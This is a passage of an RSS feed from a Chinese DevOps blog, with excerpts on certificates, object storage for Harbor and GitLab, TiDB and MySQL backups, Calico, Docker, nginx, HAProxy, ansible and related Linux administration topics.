个线程去导出数据。-F 64 是将实际的 table 切分成多大的 chunk，这里就是 64MB 一个 chunk。 --skip-tz-utc 添加这个参</description></item><item><title>使用 cfssl 自签证书</title><link>https://tangx.in/posts/2020/05/28/cfssl/</link><pubDate>Thu, 28 May 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/05/28/cfssl/</guid><description>Generate self-signed certificates If you build Container Linux cluster on top of public networks it is recommended to enable encryption for Container Linux services to prevent traffic interception and man-in-the-middle attacks. For these purposes you have to use Certificate Authority (CA), private keys and certificates signed by CA. Let&amp;rsquo;s use cfssl and walk through the whole process to create all these components. NOTE: We will use basic procedure here. If your configuration requires advanced security options, please refer to official cfssl documentation. Download cfssl CloudFlare&amp;rsquo;s distributes cfssl source code on github page and binaries on cfssl website . Our documentation assumes that you will run cfssl on your local x86_64 Linux host. 1 2 3 4 5 mkdir ~/bin curl -s -L -o ~/bin/cfssl https://pkg.cfssl.org/R1.2/cfssl_linux-amd64 curl -s -L -o ~/bin/cfssljson https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64 chmod +x ~/bin/{cfssl,cfssljson} export PATH=$PATH:~/bin Initialize a certificate authority</description></item><item><title>harbor 使用 s3v4 兼容模式对象存储保存数据</title><link>https://tangx.in/posts/2020/04/26/harbor-with-s3-compatible-storage/</link><pubDate>Sun, 26 Apr 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/04/26/harbor-with-s3-compatible-storage/</guid><description>harbor使用 s3v4 兼容模式的对象存储数据 harbor v2.0.0 测试通过 qingcloud qingstor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # The default data volume data_volume: /data # Harbor Storage settings by default is using /data dir on local filesystem # Uncomment storage_service setting If you want to using external storage # storage_service: # # ca_bundle is the path to the custom root ca certificate, which will be injected into the truststore # # of registry&amp;#39;s and chart repository&amp;#39;s containers. This is usually needed when the user hosts a internal storage with self signed certificate. # ca_bundle: #</description></item><item><title>gitlab 使用青云 qingstor 对象存储作为存储</title><link>https://tangx.in/posts/2020/04/23/gitlab-storage-with-qingstor/</link><pubDate>Thu, 23 Apr 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/04/23/gitlab-storage-with-qingstor/</guid><description>gitlab 使用青云 qingstor 对象存储作为存储 使用 s3 compatible 模式， 腾讯云、阿里云、华为云、青云 都可以实现。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # https://docs.gitlab.com/ce/administration/job_artifacts.html gitlab_rails[&amp;#39;artifacts_enabled&amp;#39;] = true gitlab_rails[&amp;#39;artifacts_object_store_enabled&amp;#39;] = true gitlab_rails[&amp;#39;artifacts_object_store_remote_directory&amp;#39;] = &amp;#34;gitlab-storage-artifacts&amp;#34; gitlab_rails[&amp;#39;artifacts_object_store_connection&amp;#39;] = { # s3v4 compatible mode # https://gitlab.com/gitlab-org/charts/gitlab/-/blob/master/examples/objectstorage/rails.minio.yaml &amp;#39;provider&amp;#39; =&amp;gt; &amp;#39;AWS&amp;#39;, &amp;#39;region&amp;#39; =&amp;gt; &amp;#39;us-east-1&amp;#39;, &amp;#39;aws_access_key_id&amp;#39; =&amp;gt; &amp;#39;ACID_XXXXXXXXXXXXXXXXX&amp;#39;, &amp;#39;aws_secret_access_key&amp;#39; =&amp;gt; &amp;#39;ACKEY_YYYYYYYYYYYYYYYY&amp;#39;, &amp;#39;aws_signature_version&amp;#39; =&amp;gt; 4, &amp;#39;host&amp;#39; =&amp;gt; &amp;#39;s3.pek3b.qingstor.com&amp;#39;, &amp;#39;endpoint&amp;#39; =&amp;gt; &amp;#34;http://s3.pek3b.qingstor.com&amp;#34;, &amp;#39;path_style&amp;#39; =&amp;gt; true }</description></item><item><title>TiDB 2.1 备份恢复与迁移</title><link>https://tangx.in/posts/2020/04/23/tidb-backup-migrate/</link><pubDate>Thu, 23 Apr 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/04/23/tidb-backup-migrate/</guid><description>TiDB 2.1 备份恢复与迁移 备份 https://pingcap.com/docs-cn/v2.1/how-to/maintain/backup-and-restore/ 使用 mydumper 备份 mydumper: https://github.com/maxbube/mydumper/releases 1 mydumper -h 127.0.0.1 -P 4000 -u root -t 32 -F 64 -B test -T t1,t2 --skip-tz-utc -o ./var/test 我们使用 -B test 表明是对 test 这个 database 操作，然后用 -T t1,t2 表明只导出 t1，t2 两张表。 -t 32 表明使用 32 个线程去导出数据。-F 64 是将实际的 table 切分成多大的 chunk，这里就是 64MB 一个 chunk。 --skip-tz-utc 添加这个参数忽略掉 TiDB 与导数据的</description></item><item><title>linux 创建本地源</title><link>https://tangx.in/posts/2020/04/04/local-repo/</link><pubDate>Sat, 04 Apr 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/04/04/local-repo/</guid><description>linux 创建本地源 ubuntu 创建 local repo 将包放在 debs 目录下, 使用如下命令创建 私有仓库索引 1 2 3 cd /data/repo dpkg-scanpackages debs/ /dev/null |gzip &amp;gt; debs/Packages.gz centos 创建 local repo 将包放在 /data/repo/centos7 目录下, 使用如下命令创建 私有仓库索引 1 2 3 cd /data/repo/centos7 createrepo .</description></item><item><title>使用 lego 申请 let's encrypt 证书</title><link>https://tangx.in/posts/2020/01/16/lego-lects-encrypt/</link><pubDate>Thu, 16 Jan 2020 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2020/01/16/lego-lects-encrypt/</guid><description>使用 lego 申请 let&amp;rsquo;s encrypt 证书 lego 是用来申请 let's encrypt 免费证书的, 现在支持多种验证方式。 以下是使用 alidns 解析验证。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #!/bin/bash # # lego-letsencrypt.sh # cd $(dirname $0) which lego || { lego_ver=v3.7.0 wget -c https://github.com/go-acme/lego/releases/download/${lego_ver}/lego_${lego_ver}_linux_amd64.tar.gz -o lego.tar.gz tar xf lego.tar.gz cp -a lego /usr/local/bin/lego } DomainList=&amp;#34;*.example.com,*.example.org&amp;#34; EMAIL=&amp;#34;your@email.com&amp;#34; export ALICLOUD_ACCESS_KEY=LTAxxxxxx export ALICLOUD_SECRET_KEY=yyyyyyyyyyyyyyyyy Domains=&amp;#34;&amp;#34; for domain in ${DOMAINs//,/ } do { Domains=&amp;#34;${Domains} --domain=${domain}&amp;#34; }</description></item><item><title>calico 配置 BGP Route Reflectors</title><link>https://tangx.in/posts/2019/12/10/calico-bgp-rr/</link><pubDate>Tue, 10 Dec 2019 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2019/12/10/calico-bgp-rr/</guid><description>calico 配置 BGP Route Reflectors Calico作为k8s的一个流行网络插件，它依赖BGP路由协议实现集群节点上的POD路由互通；而路由互通的前提是节点间建立 BGP Peer 连接。BGP 路由反射器（Route Reflectors，简称 RR）可以简化集群BGP Peer的连接方式，它是解决BGP扩展性问题的有效方式；具</description></item><item><title>calico 网络模型的简单笔记</title><link>https://tangx.in/posts/2019/11/26/calico-simple-note/</link><pubDate>Tue, 26 Nov 2019 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2019/11/26/calico-simple-note/</guid><description>calico 简单笔记 calico 是一种基础 vRouter 的3层网络模型 (BGP 网络)。 在应用到 k8s 中，可以提到常见的 flannel。 使用节点主机作为 vRouter 实现 3层转发。 提高网络性能。 calico 的网络模型 calico 可以通过设置 IP-in-IP 控制网络模型: https://docs.projectcalico.org/v3.5/usage/configuration/ip-in-ip ipipMode=Never: BGP 模型。 完全不使用 IP-in-IP 隧道， 这就是常用的 BGP 模型。 ipipMode=Always: calico 节点直接通过 IP 隧道的的方式实现节点互通。 这实际</description></item><item><title>k8s nginx ingress 添加 x-forwarded</title><link>https://tangx.in/posts/2019/08/10/nginx-ingress-x-forward/</link><pubDate>Sat, 10 Aug 2019 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2019/08/10/nginx-ingress-x-forward/</guid><description>ingress 配置 for-forward-for The client IP address will be set based on the use of PROXY protocol or from the X-Forwarded-For header value when use-forwarded-headers is enabled. https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/#use-forwarded-headers https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/#forwarded-for-header 1 2 3 4 5 6 7 8 apiVersion: extensions/v1beta1 kind: Ingress metadata: name: srv-bff-op-center annotations: nginx.ingress.kubernetes.io/forwarded-for-header: &amp;#34;X-Forwarded-For&amp;#34; kubernetes.io/ingress.class: &amp;#34;nginx&amp;#34;</description></item><item><title>dokcer daemon.json</title><link>https://tangx.in/posts/2019/04/24/docker-daemon-json/</link><pubDate>Wed, 24 Apr 2019 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2019/04/24/docker-daemon-json/</guid><description>docker daemon.json 配置文件 daemon.json 配置方式 Linux: /etc/docker/daemon.json Windows Server: C:\ProgramData\docker\config\daemon.json Docker for Mac / Docker for Windows: Click the Docker icon in the toolbar, select Preferences, then select Daemon. Click Advanced. daemon.json 配置 镜像加速器 1 2 3 4 5 6 7 8 9 // 配置一个 { &amp;#34;registry-mirrors&amp;#34;: [&amp;#34;https://registry.docker-cn.com&amp;#34;] } // 配置多个 { &amp;#34;registry-mirrors&amp;#34;: [&amp;#34;https://registry.docker-cn.com&amp;#34;,&amp;#34;https://docker.mirrors.ustc.edu.cn&amp;#34;] } 镜像加速器常用值： docker-cn 官方 : https://registry.docker-cn.com 中科大 : https://docker.mirrors.ustc.edu.cn 日志 1 2 3 4 { &amp;#34;debug&amp;#34;: true, &amp;#34;log-level&amp;#34;: &amp;#34;info&amp;#34; } log-level 的有效值包括: debug, info, warn, error, fatal 监控 Prometheus https://docs.docker.com/engine/admin/prometheus/#configure-docker 1 2 3 4 { &amp;#34;metrics-addr&amp;#34; : &amp;#34;127.0.0.1:9323&amp;#34;, &amp;#34;experimental&amp;#34; : true } 保持容器在线 https://docs.docker.com/engine/admin/live-restore/#enable-the-live-restore-option 当</description></item><item><title>关于 nginx uri 的截取</title><link>https://tangx.in/posts/2019/04/23/nginx-uri/</link><pubDate>Tue, 23 Apr 2019 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2019/04/23/nginx-uri/</guid><description>关于 uri 的截取 location 中的 root 和 alias root 指令只是将搜索的根设置为 root 设定的目录，即不会截断 uri，而是使用原始 uri 跳转该目录下查找文件 alias 指令则会截断匹配的 uri，然后使用 alias 设定的路径加上剩余的 uri 作为子路径进行查找 示例 1： root #------------目录结构---------- /www/x1/index.html /www/x2/index.html #--------</description></item><item><title>TCP keepalive 探活机制</title><link>https://tangx.in/posts/2019/04/19/tcp-keepalive/</link><pubDate>Fri, 19 Apr 2019 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2019/04/19/tcp-keepalive/</guid><description>TCP keepalive 探活机制 Content here 参考资料 tcp keepalive howto tcp 协议 syn 攻击 为什么基于TCP的应用需要心跳包</description></item><item><title>使用 Dockerfile 构建镜像注意事项</title><link>https://tangx.in/posts/2019/03/26/how-to-build-a-image-with-dockerfile/</link><pubDate>Tue, 26 Mar 2019 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2019/03/26/how-to-build-a-image-with-dockerfile/</guid><description>怎样去构建一个优质的Docker容器镜像 抛砖引玉 先说结论 以不变应万变 一个相对固定的 build 环境 善用 cache 构建 自己的基础镜像 精简为美 使用 .dockerignore 保持 context 干净 容器镜像环境清理 缓存清理 multi stage build 你需要的了解的参考资料 docker storage driver: https://docs.docker.com/storage/storagedriver/ dockerfile best practices: https://docs.docker.com/develop/develop-images/dockerfile_best-practices/ multi-stage: https://docs.docker.com/develop/develop-images/multistage-build/ 为什么要优化镜像 一个小镜像有什么好处: 分发更快，存储更少，加载更快。 镜像</description></item><item><title>golang-use-regex-group</title><link>https://tangx.in/posts/2019/03/21/golang-use-regex-group/</link><pubDate>Thu, 21 Mar 2019 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2019/03/21/golang-use-regex-group/</guid><description>golang 使用 regex group 的值 与常用的语言正则不同， golang 使用 $1 表示 regex group。 而类似 sed, python 中常用的是 \1 golang playgroud 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package main import ( &amp;#34;fmt&amp;#34; &amp;#34;regexp&amp;#34; ) func main() { re := regexp.MustCompile(`([A-Z])`) s := re.ReplaceAllString(&amp;#34;UserCreate&amp;#34;, &amp;#34;.$1&amp;#34;) fmt.Println(s) // .User.Create } func Test_Regexp(t *testing.T) { chars := `(&amp;#39;|&amp;#34;)` str := `&amp;#34;123&amp;#39;abc&amp;#39;456&amp;#34;` re := regexp.MustCompile(chars) s := re.ReplaceAllString(str, `\$1`) // 这里可以使用 ` 反引号 fmt.Println(s) // \&amp;#34;123\&amp;#39;abc\&amp;#39;456\&amp;#34; } // https://stackoverflow.com/questions/43586091/how-golang-replace-string-by-regex-group python 1 2 3 import re name = re.sub(r&amp;#39;([A-Z])&amp;#39;, r&amp;#39;.\1&amp;#39;, &amp;#34;UserCreate&amp;#34;) print(name) # .User.Create</description></item><item><title>K8S 中使用 Heketi 管理 GlusterFS</title><link>https://tangx.in/posts/2018/11/15/k8s-with-heketi/</link><pubDate>Thu, 15 Nov 2018 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2018/11/15/k8s-with-heketi/</guid><description>K8S 中使用 Heketi 管理 GlusterFS 与 官方文档不同 ， 本文中的 glusterfs 是独立与 k8s 之外的。 Heketi heketi 项目 为 GlusterFS 提供 RESTful 的 API 管理。 Requirements System must have glusterd service enabled and glusterfs-server installed Disks registered with Heketi must be in raw format. 目前提供两种管理方式: ssh, kubernetes heketi-ssh SSH Access SSH user and public key already setup on the node SSH user must have password-less sudo Must be able to run sudo commands from ssh. This requires disabling requiretty in the /etc/sudoers file 使用容器部署 https://hub.docker.com/r/heketi/heketi/ heketi-kubernetes 带实现 勘误 在使用 K8S 部署时， 如果客户端报错</description></item><item><title>K8S节点下载 gcr.io 原生镜像</title><link>https://tangx.in/posts/2018/11/09/k8s-pull-image-from-gcr.io/</link><pubDate>Fri, 09 Nov 2018 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2018/11/09/k8s-pull-image-from-gcr.io/</guid><description>K8S下载 gcr.io 原生镜像 在国内是不能直接下载 gcr.io / k8s.gcr.io 等原生镜像的。 使用比较权威的三方源 aliyun , qcloud 将 gcr.io push 到 hub.docker.com 自建镜像代理 域名翻墙 域名翻墙 通过域名劫持，将目标地址直接解析到代理服务器上。 sniproxy 所有你需要的， 一个能直接访问 gcr.ip 的 https(443) 代理。 通过 sniproxy 实现。 通过 防火墙 , 安全组 限制访问来源。 1 2 # docker run -d --rm --network host --name sniproxy</description></item><item><title>docker multi-stage build</title><link>https://tangx.in/posts/2018/10/30/docker-multi-stage-build/</link><pubDate>Tue, 30 Oct 2018 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2018/10/30/docker-multi-stage-build/</guid><description>Docker multi-stage build Multi-stage 构建，最大的好处是 Docker 本身在构建过程中提供了一个缓存空间，将上一个 stage 的结果通过 COPY --from=&amp;lt;stage&amp;gt; 复制到下一个 stage。 这样就大大简化了镜像清理工作。 这里， docker 官方文档已经对 Multi-stage build 已经有详细说明了。 multi-stage 要求 docker version &amp;gt;= 17.05 举例 每一个 FROM 关键字都表示此处是一个 stage 对 stage 使用命令的关键字是 as ， 例如 FROM alpine:latest as initer 在引用</description></item><item><title>Haproxy反向代理FTP</title><link>https://tangx.in/posts/2018/10/29/ftp-proxy/</link><pubDate>Mon, 29 Oct 2018 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2018/10/29/ftp-proxy/</guid><description>Haproxy 反向代理 FTP 4层 代理 haproxy-1.5.18-7.el7.x86_64 #--------------------------------------------------------------------- # Example configuration for a possible web application. See the # full configuration options online. # # http://haproxy.1wt.eu/download/1.4/doc/configuration.txt # #--------------------------------------------------------------------- #--------------------------------------------------------------------- # Global settings #--------------------------------------------------------------------- global # to have these messages end up in /var/log/haproxy.log you will # need to: # # 1) configure syslog to accept network log events. This is done # by adding the &amp;#39;-r&amp;#39; option to the SYSLOGD_OPTIONS in # /etc/sysconfig/syslog # # 2) configure local2 events to go to the /var/log/haproxy.log # file. A line like the following can be added to # /etc/sysconfig/syslog # # local2.* /var/log/haproxy.log # log 127.0.0.1 local2 chroot /var/lib/haproxy pidfile /var/run/haproxy.pid maxconn 4000 user root group root daemon # turn on stats unix socket stats socket /var/lib/haproxy/stats #--------------------------------------------------------------------- # common defaults that all the &amp;#39;listen&amp;#39; and &amp;#39;backend&amp;#39; sections</description></item><item><title>k8s node 节点</title><link>https://tangx.in/posts/2018/10/13/k8s-resource-node.md/</link><pubDate>Sat, 13 Oct 2018 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2018/10/13/k8s-resource-node.md/</guid><description>k8s node 节点介绍 node 是 k8s 的工作节点， cpu, memory 的提供者。 上面运行这实际工作的 pod。 node 的服务包括 container 环境、 kubelet 和 kube-proxy。 使用 kubectl 管理 node 基础语法为 : kubectl flag node &amp;lt;node_name&amp;gt; kubectl cordon / uncordon 1 2 3 4 # 驱逐 kubectl cordon node &amp;lt;node_name&amp;gt; # 恢复 kubectl uncordon node &amp;lt;node_name&amp;gt;</description></item><item><title>kubernetes POD 介绍</title><link>https://tangx.in/posts/2018/10/13/k8s-object-pod.md/</link><pubDate>Sat, 13 Oct 2018 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2018/10/13/k8s-object-pod.md/</guid><description>k8s POD 介绍 POD 在 k8s 中是最小管理单位。</description></item><item><title>filebeat将多行日志视作一样的参数配置</title><link>https://tangx.in/posts/2017/11/11/filebeat-multi-line/</link><pubDate>Sat, 11 Nov 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/11/11/filebeat-multi-line/</guid><description>filebeat 将多行日志视作一样的参数配置 在 filebeat 格式化日志是，可以配置 pattern 将多行日志合并成一样。 在配置文件 filebeat.yml 中，协同完成这个功能的参数有 4 个。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # The regexp Pattern that has to be matched. # 设置行的匹配字段 multiline.pattern: &amp;#39;^[[:space:]]|^[[:alpha:]]&amp;#39; # Defines if the pattern set under pattern should be negated or not. Default is false. # 设置符合上面匹配条件的的行，是否应该被合</description></item><item><title>Linux 下的几个命令行下载工具</title><link>https://tangx.in/posts/2017/11/05/cli-download-tools-for-linux/</link><pubDate>Sun, 05 Nov 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/11/05/cli-download-tools-for-linux/</guid><description>Linux 下的几个命令行下载工具 linux 下最常用的 wget 是单线程的。虽然好用，但不够用。例如在下载阿里云的数据库备份文件，单线程最多能达到 10Mbps，即使是走内网。 因此，有必要换一下其他的。 axel https://github.com/axel-download-accelerator/axel axel 相较 wget 最大的优点就是支持多线程。 在 ubuntu 16.04 LST 上安装非常简单，已经加入了官方源。 CentOS 系列的话，就去 pkgs.org 上找到对</description></item><item><title>使用 sshpass 传递密码</title><link>https://tangx.in/posts/2017/11/05/sshpass/</link><pubDate>Sun, 05 Nov 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/11/05/sshpass/</guid><description>使用 sshpass 传递密码 使用 sshpass 给 ansible 传递密码 1 2 3 4 5 $ sshpass -p &amp;#39;xxxxxxxx&amp;#39; ansible -i dsgl_domantic.py all -m ping --limit=1x.x.x.x0 -u root --ask-pass 1x.x.x.x0 | SUCCESS =&amp;gt; { &amp;#34;changed&amp;#34;: false, &amp;#34;ping&amp;#34;: &amp;#34;pong&amp;#34; } 将密码写入命令行中 1 sshpass -p &amp;#39;your_password_string&amp;#39; ssh 58.*.*.197 将密码写入变量中 1 2 export SSHPASS=&amp;#39;your_password_string&amp;#39; sshpass -e ssh 118.*.*.16 将密码写入文件中 1 2 3 echo &amp;#39;your_password_string&amp;#39; &amp;gt; sshpass.sec sshpass -f sshpass.sec ssh 118.*.*.16</description></item><item><title>MYSQL 导出用户权限脚本</title><link>https://tangx.in/posts/2017/10/24/mysql-backup-user-grants/</link><pubDate>Tue, 24 Oct 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/10/24/mysql-backup-user-grants/</guid><description>MYSQL 导出用户权限脚本 分享一个抄来的 mysql 备份权限的脚本 。这个脚本最大的好处是通用，不用像之前那样备份 mysql.user 表而造成在不同 mysql 实例之间造成不必要的问题。 1 2 3 4 5 6 7 8 9 10 11 #!/bin/bash #Function export user privileges source /etc/profile pwd=your_password MYSQL_AUTH=&amp;#34; -uroot -p${pwd} -h127.0.0.1 --port=3306 &amp;#34; expgrants() { mysql -B ${MYSQL_AUTH} -N $@ -e &amp;#34;SELECT CONCAT(&amp;#39;SHOW GRANTS FOR &amp;#39;&amp;#39;&amp;#39;, user, &amp;#39;&amp;#39;&amp;#39;@&amp;#39;&amp;#39;&amp;#39;, host, &amp;#39;&amp;#39;&amp;#39;;&amp;#39;) AS query FROM mysql.user&amp;#34; | mysql ${MYSQL_AUTH} $@ | sed &amp;#39;s/\(GRANT .*\)/\1;/;s/^\(Grants for .*\)/-- \1 /;/--/{x;p;x;}&amp;#39; } expgrants &amp;gt; ./grants.sql http://www.cnblogs.com/huangmr0811/p/5570994.html</description></item><item><title>使用 docker-compose 发布 dokuwiki</title><link>https://tangx.in/posts/2017/09/28/docker-compose-file-nginx-and-php-and-dokuwiki/</link><pubDate>Thu, 28 Sep 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/09/28/docker-compose-file-nginx-and-php-and-dokuwiki/</guid><description>使用 docker-compose 发布 dokuwiki 总结： php file not found: 因为 php 容器找不到 php 文件 将 dokuwiki 也映射到 php 容器即可 permission denied : 因为容器中跑 fpm 的 用户ID 与 本地用户ID 不同，从而导致容器无法修改 dokuwiki 目录中的文件。 创建 dockerfile 重新 build php 镜像，是二者 用户ID 一致即可。 php file not found 之前一直在同一台机器上配置 php 和 nginx ， 因此用来没注意到， php 程序需要对 nginx root 目录</description></item><item><title>LVS 基本信息介绍</title><link>https://tangx.in/posts/2017/09/02/lvs-thoery/</link><pubDate>Sat, 02 Sep 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/09/02/lvs-thoery/</guid><description>LVS 介绍 本来想自己画图写介绍的，结果看了官网，里面的内容更详细更直接，所以就直接看 LVS 官网 中文 吧。 三种调度算法 NAT 模式: 网络地址转换 Network Address Translation TUN 模式: IP 隧道 IP Tunneling DR 模式: 直接路由 Direct Routing 更详细的介绍可以直接看官网 LVS集群中的IP负载均衡技术 这里简单的说一下三种模式的调度原理 NAT 模式 优点： RS 可以是</description></item><item><title>iptables 基础知识和基本用法</title><link>https://tangx.in/posts/2017/08/31/iptables-basic-theory-and-useage/</link><pubDate>Thu, 31 Aug 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/08/31/iptables-basic-theory-and-useage/</guid><description>iptables 基础知识和基本用法 iptables传输数据包的过程 当一个数据包进入网卡时，它首先进入PREROUTING链，内核根据数据包目的IP判断是否需要转送出去。 如果数据包就是进入本机的，它就会沿着图向下移动，到达INPUT链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程</description></item><item><title>LVM 磁盘管理与在线扩容</title><link>https://tangx.in/posts/2017/08/25/lvm-management-and-online-extend/</link><pubDate>Fri, 25 Aug 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/08/25/lvm-management-and-online-extend/</guid><description>LVM 磁盘管理与在线扩容 不上 LVM 的服务器都是耍流氓 在线扩容 通过 LVM 扩容的时候， 被扩容的逻辑卷 不需要重新格式化 被扩容的逻辑卷 不需要被 umount 被扩容的逻辑卷上的业务 不受影响 在执行 resize2fs 或 xfs_growfs 的时候，会有一定等待时间，属于正常显现。 虽然扩容还是很安全的，不过，有条件的话，最好还是进行必要的备份 扩容步骤 创建</description></item><item><title>怎么通过命令行方式向 mysql 数据库导入一个大型备份文件</title><link>https://tangx.in/posts/2017/08/03/how-to-import-a-large-sql-dump-file-to-a-mysql-database-from-command-line/</link><pubDate>Thu, 03 Aug 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/08/03/how-to-import-a-large-sql-dump-file-to-a-mysql-database-from-command-line/</guid><description>怎么通过命令行方式向 mysql 数据库导入一个大型备份文件 接受了一个老项目，有个200多G 的文件需要恢复。里面有有几张记录日志的单表很大，在备份的时候没有使用 --extended-inster=False ， 因此，在使用 mysql database &amp;lt; file.sql 导入的时候，一不留神进程就死掉了。 google 了很久，最终得到以下答案 原文链接 ： https://cmanios.wordpress.com/2013/03/19/import-a-large-sql-dump-file-to-a-mysql-database-from-command-line/ 是通过在 mysql 交互界面中 source 文件的方式导入</description></item><item><title>为 linux 系统软件配置代理</title><link>https://tangx.in/posts/2017/07/12/proxy-for-linux-software/</link><pubDate>Wed, 12 Jul 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/07/12/proxy-for-linux-software/</guid><description>为 linux系统软件配置 socks 和 http 代理 use sslocal to setup a socks5 proxy 1 2 3 4 pip install shadowsocks sslocal --help CENTOS 6 install privoxy https://superuser.com/questions/452197/how-to-install-privoxy-on-centos-6 1 2 3 4 5 6 7 8 9 10 11 12 13 # These commands are more easier and manageable wget http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm rpm -Uvh epel-release-6-8.noarch.rpm yum install privoxy -y # In future if you want to update yum update privoxy -y # Ref: http://pkgs.org/centos-6/epel-x86_64/privoxy-3.0.21-3.el6.x86_64.rpm.html # shareimprove this answer transfer protocol from socks to http via privoxy https://wiki.archlinux.org/index.php/Shadowsocks_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) https://blog.phpgao.com/privoxy-shadowsocks.html 方法二： 1.直接指定Chromium走socks代理似乎不能远程dns解析，这未必是用</description></item><item><title>ansible 2.3.0.0 条件判断</title><link>https://tangx.in/posts/2017/05/09/ansible-2.3.0.0-condition-conditional-examples/</link><pubDate>Tue, 09 May 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/05/09/ansible-2.3.0.0-condition-conditional-examples/</guid><description>ansible 2.3.0.0 条件判断 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134</description></item><item><title>ansible synchronize 同步文件夹</title><link>https://tangx.in/posts/2017/04/12/ansible-copy-directories-to-remote-hosts-synchronize_module/</link><pubDate>Wed, 12 Apr 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/04/12/ansible-copy-directories-to-remote-hosts-synchronize_module/</guid><description>ansible synchronize 同步文件夹 使用 ansible synchronize_module 可以控制机和目标机之间同步目录 1 2 3 4 cat /root/ansible_copy/hosts [backup] 10.1.1.1 serverid=1001 ansible_ssh_user=backup_user ansible_ssh_port=22 通过 mode 控制同步方向 mode=push 默认值。 从『控制机』到『目标机』 mode=pull 从『目标机』到『控制机』 推送 push 1 2 3 ansible -i /root/ansible_copy/hosts backup -m synchronize -a &amp;#39;src=https://tangx.in/tmp/svr_01/backup/ dest=/tmp/svr_02/backup/&amp;#39; ansible -i /root/ansible_copy/hosts backup -m synchronize -a &amp;#39;mode=push src=https://tangx.in/tmp/svr_01/backup/ dest=/tmp/svr_02/backup/&amp;#39; 拉取 pull 1 ansible -i /root/ansible_copy/hosts backup -m synchronize -a &amp;#39;mode=pull src=https://tangx.in/tmp/svr_01/backup/ dest=/tmp/svr_02/backup/&amp;#39; delegate_to 授权 需要注意的是，使用 delegate_to 授权机进行 synchronize 。需要保证授</description></item><item><title>闰年的最佳效率演算法</title><link>https://tangx.in/posts/2017/03/06/%E6%9C%80%E4%BD%B3%E9%97%B0%E5%B9%B4%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 06 Mar 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/03/06/%E6%9C%80%E4%BD%B3%E9%97%B0%E5%B9%B4%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</guid><description>闰年的最佳效率演算法 閏年的最佳效率演算法 所謂閏年，維基百科做了如是介紹： 閏年是比普通年分多出一段時間的年分，在各種曆法中都有出現，目的是為了彌補人為規定的紀年與地球公轉產生的差異。 目前使用的格里曆閏年規則如下： 西元年分除以400可整除，為閏年。 西元年分除以4可整除但除以100不可</description></item><item><title>使用 FIO 测试磁盘 IOPS 性能</title><link>https://tangx.in/posts/2017/03/06/%E7%A3%81%E7%9B%98IOPS%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</link><pubDate>Mon, 06 Mar 2017 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2017/03/06/%E7%A3%81%E7%9B%98IOPS%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</guid><description>使用 FIO 测试磁盘 IOPS 性能 磁盘IOPS测试 linux 使用 FIO 测试 FIO是测试IOPS的非常好的工具，用来对硬件进行压力测试和验证，支持13种不同的I/O引擎，包括:sync,mmap, libaio, posixaio, SG v3, splice, null, network, syslet, guasi, solarisaio 等等。 FIO 安装 1 2 3 